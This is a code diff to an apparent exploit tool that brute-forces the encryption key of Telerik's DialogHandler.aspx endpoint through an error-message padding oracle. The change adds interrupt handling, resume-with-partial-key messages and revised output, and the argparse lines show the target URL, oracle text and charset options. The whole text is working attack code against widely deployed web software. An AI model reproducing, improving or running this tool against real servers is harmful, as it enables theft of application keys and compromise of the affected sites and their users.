@@ -153,41 +153,50 @@ def get_key(session, found):
         ) +
         "]\n"
     )
-    for i in range(len(found), int(key_length)):
-        pos_str = (
-            str(i + 1)
-            if i > 8
-            else "0" + str(i + 1)
-        )
-        sys.stdout.write("Key position " + pos_str + ": (------")
-        sys.stdout.flush()
-        keychar = test_keypos(key_charset, unprintable, found, session)
-        if keychar is not False:
-            found = found + keychar
-            sys.stdout.write(
-                          "\b"*7 + "{" +
-                          (
-                              keychar
-                              if unprintable is False
-                              else '0x' + binascii.hexlify(keychar.encode()).decode()
-                          ) +
-                          "} found with " +
-                          str(char_requests) +
-                          " requests, total so far: " +
-                          str(requests_sent) +
-                          "\n"
-                      )
+    try:
+        for i in range(len(found), int(key_length)):
+            pos_str = (
+                str(i + 1)
+                if i > 8
+                else "0" + str(i + 1)
+            )
+            sys.stdout.write("Key position " + pos_str + ": (------")
             sys.stdout.flush()
-            char_requests = 0
-        else:
-            sys.stdout.write("\b"*7 + "Not found, quitting\n")
-            sys.stdout.flush()
-            break
-    if keychar is not False:
-        print("Found key: (hex) " + binascii.hexlify(found.encode()).decode())
+            keychar = test_keypos(key_charset, unprintable, found, session)
+            if keychar is not False:
+                found = found + keychar
+                sys.stdout.write(
+                              "\b"*7 + "{" +
+                              (
+                                  keychar
+                                  if unprintable is False
+                                  else '0x' + binascii.hexlify(keychar.encode()).decode()
+                              ) +
+                              "} found with " +
+                              str(char_requests) +
+                              " requests, total so far: " +
+                              str(requests_sent) +
+                              "\n"
+                          )
+                sys.stdout.flush()
+                char_requests = 0
+            else:
+                sys.stdout.write("\b"*7 + "Not found, quitting\n")
+                sys.stdout.flush()
+                break
+    except KeyboardInterrupt:
+        print("\nStopping...")
+        if len(found) > 0:
+            print("  to resume, supply the key found so far to the -r / --resume-key argument")
+    if keychar is not False and len(found) > 0:
+        print("Found " + str(len(found)) + " of " + str(key_length) + " key characters: (ASCII hex) " + binascii.hexlify(found.encode()).decode())
+    else:
+        # Prevent version checking if failed on a character.
+        # If cancelled then still worth checking versions based on key progress
+        # because key might be shorter than the supposed length and repeating
+        found = ''
     print("Total web requests: " + str(requests_sent))
     return found
-
 
 def mode_brutekey():
     session = requests.Session()
@@ -334,7 +343,7 @@ brute_parser.set_defaults(func=mode_brutekey)
 brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL, e.g. https://???.???.???/Telerik.Web.UI.DialogHandler.aspx')
 brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
 brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
-brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')
+brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than testing known possibilities')
 brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined. OPTIONAL: default is hex')
 brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
     accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')
